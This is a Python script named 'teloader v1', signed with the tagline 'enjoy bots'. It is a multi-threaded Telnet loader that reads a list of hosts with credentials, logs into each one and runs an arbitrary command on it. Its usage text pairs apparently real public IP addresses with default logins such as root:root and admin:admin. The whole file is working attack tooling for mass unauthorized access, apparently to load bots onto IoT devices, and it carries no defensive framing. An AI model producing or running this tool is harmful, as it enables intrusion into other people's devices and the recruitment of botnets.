import telnetlib
import socket
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

#     .....                           ..          ...                                 ..                               
#  .H8888888h.  ~-.             x .d88"       .zf"` `"tu                            dF                                 
#  888888888888x  `>             5888R       x88      '8N.        u.               '88bu.                    .u    .   
# X~     `?888888hx~      .u     '888R       888k     d88&  ...ue888b        u     '*88888bu        .u     .d88B :@8c  
# '      x8.^"*88*"    ud8888.    888R       8888N.  @888F  888R Y888r    us888u.    ^"*8888N    ud8888.  ="8888f8888r 
#  `-:- X8888x       :888'8888.   888R       `88888 9888%   888R I888> .@88 "8888"  beWE "888L :888'8888.   4888>'88"  
#       488888>      d888 '88%"   888R         %888 "88F    888R I888> 9888  9888   888E  888E d888 '88%"   4888> '    
#     .. `"88*       8888.+"      888R          8"   "*h=~  888R I888> 9888  9888   888E  888E 8888.+"      4888>      
#   x88888nX"      . 8888L        888R        z8Weu        u8888cJ888  9888  9888   888E  888F 8888L       .d888L .+   
#  !"*8888888n..  :  '8888c. .+  .888B .     ""88888i.   Z  "*888*P"   9888  9888  .888N..888  '8888c. .+  ^"8888*"    
# '    "*88888888*    "88888%    ^*888%     "   "8888888*     'Y"      "888*""888"  `"888*""    "88888%       "Y"      
#         ^"***"`       "YP'       "%             ^"**""                ^Y"   ^Y'      ""         "YP'                 
                                                                                                                     
#                                                                           teloader v1 by @Syn2Much
#                                                                                 enjoy bots                                    
# Lock for thread-safe printing
print_lock = Lock()

TIMEOUT = 10  # Connection timeout in seconds


def safe_print(*args, **kwargs):
    """Thread-safe print function."""
    with print_lock:
        print(*args, **kwargs)


def parse_target(target_line):
    """Parse a target line into host, port, username, password."""
    target_line = target_line.strip()
    if not target_line:
        return None
    
    parts = target_line.split()
    if len(parts) != 2:
        return None
    
    host_port, user_pass = parts
    
    # Parse host:port
    if ':' in host_port:
        host, port = host_port.rsplit(':', 1)
        port = int(port)
    else:
        host = host_port
        port = 23  # Default telnet port
    
    # Parse user:password
    if ':' in user_pass:
        user, password = user_pass.split(':', 1)
    else:
        user = user_pass
        password = ""
    
    return {'host': host, 'port': port, 'user': user, 'password': password}


def telnet_connect(target, command="uname -a"):
    """Connect to a single target and execute commands."""
    host = target['host']
    port = target['port']
    user = target['user']
    password = target['password']
    
    result = {
        'host': host,
        'port': port,
        'user': user,
        'success': False,
        'output': '',
        'error': ''
    }
    
    try:
        # Connect to the Telnet server
        tn = telnetlib.Telnet(host, port, timeout=TIMEOUT)
        
        # Login process - handle different prompt styles
        index, match, text = tn.expect([b"login: ", b"Login: ", b"Username: "], timeout=TIMEOUT)
        tn.write(user.encode('ascii') + b"\n")
        
        index, match, text = tn.expect([b"Password: ", b"password: "], timeout=TIMEOUT)
        tn.write(password.encode('ascii') + b"\n")
        
        # Small delay to receive shell prompt
        tn.read_until(b"$ ", timeout=3)  # or # for root
        
        # Execute command
        tn.write(command.encode('ascii') + b"\n")
        tn.write(b"exit\n")
        
        # Read and store the output
        output = tn.read_all().decode('ascii', errors='replace')
        result['output'] = output.strip()
        result['success'] = True
        
        tn.close()
        
    except socket.timeout:
        result['error'] = "Connection timed out"
    except ConnectionRefusedError:
        result['error'] = "Connection refused"
    except EOFError:
        result['error'] = "Connection closed by remote host"
    except Exception as e:
        result['error'] = str(e)
    
    return result


def load_targets(filename):
    """Load targets from a file."""
    targets = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                parsed = parse_target(line)
                if parsed:
                    targets.append(parsed)
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found.")
        exit(1)
    except Exception as e:
        print(f"Error reading file: {e}")
        exit(1)
    
    return targets


def main():
    parser = argparse.ArgumentParser(
        description='Multi-threaded Telnet connection tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Example usage:
  python telnet_scan.py -l targets.txt -t 10
  python telnet_scan.py -l targets.txt -t 20 -c "whoami"
  python telnet_scan.py -l targets.txt -t 5 -o results.txt

Target file format (one per line):
  IP:PORT USER:PASSWORD
  18.181.177.7:23 root:root
  221.1.120.79:23 admin:admin
        '''
    )
    
    parser.add_argument('-l', '--list', required=True, 
                        help='File containing target list')
    parser.add_argument('-t', '--threads', type=int, default=10,
                        help='Number of threads (default: 10)')
    parser.add_argument('-c', '--command', default='uname -a',
                        help='Command to execute (default: uname -a)')
    parser.add_argument('-o', '--output', 
                        help='Output file for results')
    parser.add_argument('--timeout', type=int, default=10,
                        help='Connection timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    global TIMEOUT
    TIMEOUT = args.timeout
    
    # Load targets
    targets = load_targets(args.list)
    
    if not targets:
        print("No valid targets found in the file.")
        exit(1)
    
    print(f"[*] Loaded {len(targets)} targets")
    print(f"[*] Using {args.threads} threads")
    print(f"[*] Command: {args.command}")
    print(f"[*] Timeout: {args.timeout}s")
    print("=" * 60)
    
    results = []
    successful = 0
    failed = 0
    
    # Process targets with thread pool
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        # Submit all tasks
        future_to_target = {
            executor.submit(telnet_connect, target, args.command): target 
            for target in targets
        }
        
        # Process results as they complete
        for future in as_completed(future_to_target):
            result = future.result()
            results.append(result)
            
            if result['success']:
                successful += 1
                safe_print(f"\n[+] SUCCESS: {result['host']}:{result['port']} ({result['user']})")
                safe_print(f"    Output: {result['output'][:200]}")
            else:
                failed += 1
                safe_print(f"\n[-] FAILED: {result['host']}:{result['port']} - {result['error']}")
    
    # Print summary
    print("\n" + "=" * 60)
    print(f"[*] Completed: {successful} successful, {failed} failed")
    
    # Save results to file if specified
    if args.output:
        with open(args.output, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("SUCCESSFUL CONNECTIONS\n")
            f.write("=" * 60 + "\n\n")
            
            for r in results:
                if r['success']:
                    f.write(f"Host: {r['host']}:{r['port']}\n")
                    f.write(f"User: {r['user']}\n")
                    f.write(f"Output:\n{r['output']}\n")
                    f.write("-" * 40 + "\n\n")
            
            f.write("\n" + "=" * 60 + "\n")
            f.write("FAILED CONNECTIONS\n")
            f.write("=" * 60 + "\n\n")
            
            for r in results:
                if not r['success']:
                    f.write(f"Host: {r['host']}:{r['port']} - {r['error']}\n")
        
        print(f"[*] Results saved to: {args.output}")


if __name__ == "__main__":
    main()
